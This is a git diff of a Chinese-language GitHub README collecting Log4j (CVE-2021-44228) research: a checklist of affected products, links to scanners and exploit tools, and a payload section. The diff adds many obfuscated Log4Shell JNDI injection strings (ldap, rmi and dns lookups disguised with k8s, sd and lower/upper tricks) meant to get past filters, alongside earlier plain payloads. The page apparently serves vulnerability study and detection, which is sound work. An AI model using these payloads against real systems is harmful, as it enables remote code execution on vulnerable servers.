@@ -2,7 +2,7 @@
 
 **Log4j影响实在太大了，本人开始写专项漏洞检测工具-永恒之恶龙。Star超过200[发布](https://github.com/Goqi/ELong)！欢迎关注，感谢小星星！**
 
-本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2021年12月26日。作者：[0e0w](https://github.com/0e0w/HackLog4j)
+本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2021年12月28日。作者：[0e0w](https://github.com/0e0w/HackLog4j)
 
 - [00-Log4j永恒恶龙](https://github.com/0e0w/HackLog4j#00-log4j%E6%B0%B8%E6%81%92%E6%81%B6%E9%BE%99)
 - [01-Log4j基础知识](https://github.com/0e0w/HackLog4j#01-log4j%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)
@@ -30,24 +30,24 @@
 
 **log4j + ？ = rce ！**
 
-- [ ] Apache Flink
-- [ ] Apache Struts2
+- [x] Apache Flink
+- [x] Apache Struts2
 - [ ] Apache Spark
+- [x] Apache Storm
 - [ ] Apache Tomcat
 - [x] Apache Solr
 - [ ] Apache Dubbo
 - [ ] Apache Druid
-- [ ] Apache OFBiz
-- [ ] flume
+- [x] Apache OFBiz
+- [ ] Apache Flume
 - [ ] Redis
-- [ ] logstash
+- [ ] Logstash
 - [ ] ElasticSearch
-- [ ] kafka
-- [ ] ghidra
+- [ ] Apache Kafka
+- [ ] Ghidra
 - [ ] Spring-Boot-strater-log4j2
 - [ ] VMware vCenter
 - [ ] Minecraft
-- [ ] Logstash
 - ......
 - https://fofa.so/static_pages/log4j2
 - https://github.com/cisagov/log4j-affected-db
@@ -72,8 +72,8 @@
 一、Payload
 
 ```
-${jndi:rmi://127.0.0.1/poc}
 ${jndi:ldap://127.0.0.1/poc}
+${jndi:rmi://127.0.0.1/poc}
 ${jndi:dns://127.0.0.1/poc}
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
 ${${::-j}ndi:rmi://127.0.0.1/poc}
@@ -111,9 +111,25 @@ ${jvmrunargs:ldap://127.0.0.1/poc}
 ${sys:ldap://127.0.0.1/poc}
 ${env:ldap://127.0.0.1/poc}
 ${log4j:ldap://127.0.0.1/poc}
+${j${k8s:k5:-ND}i${sd:k5:-:}${lower:l}d${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}
+${jndi:rmi://127.0.0.1}/
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://127.0.0.1/poc}
+${jndi:dns://127.0.0.1}
+${j${k8s:k5:-ND}i:ldap://127.0.0.1/poc}
+${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//127.0.0.1/poc}
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://127.0.0.1/poc}
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//127.0.0.1/poc}
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://127.0.0.1/poc}
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//127.0.0.1/poc}
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//127.0.0.1/poc}
+${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//127.0.0.1/poc
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//127.0.0.1/poc}
+${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1}
+${jnd${upper:i}:ldap://127.0.0.1/poc}
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://127.0.0.1/poc}
+${jndi:ldap://127.0.0.1#127.0.0.1:1389/poc}
 ```
 
-- https://github.com/fullhunt/log4j-scan
 - https://github.com/test502git/log4j-fuzz-head-poc
 - https://github.com/woodpecker-appstore/log4j-payload-generator
 - https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
@@ -131,6 +147,7 @@ ${log4j:ldap://127.0.0.1/poc}
 - https://github.com/lijiejie/log4j2_vul_local_scanner
 - https://github.com/palantir/log4j-sniffer
 - https://github.com/mergebase/log4j-detector
+- https://www.t00ls.cc/thread-63931-1-1.html
 
 三、出网检测
 
@@ -165,9 +182,11 @@ ${log4j:ldap://127.0.0.1/poc}
 - https://github.com/gh0stkey/Log4j2-RCE-Scanner
 - https://github.com/p1n93r/Log4j2Scan
 
-七、Host头检测
+七、Header检测
 
+- https://github.com/fullhunt/log4j-scan
 - https://github.com/0xInfection/LogMePwn
+- https://github.com/TaroballzChen/CVE-2021-44228-log4jVulnScanner-metasploit
 
 八、请求参数检测
 
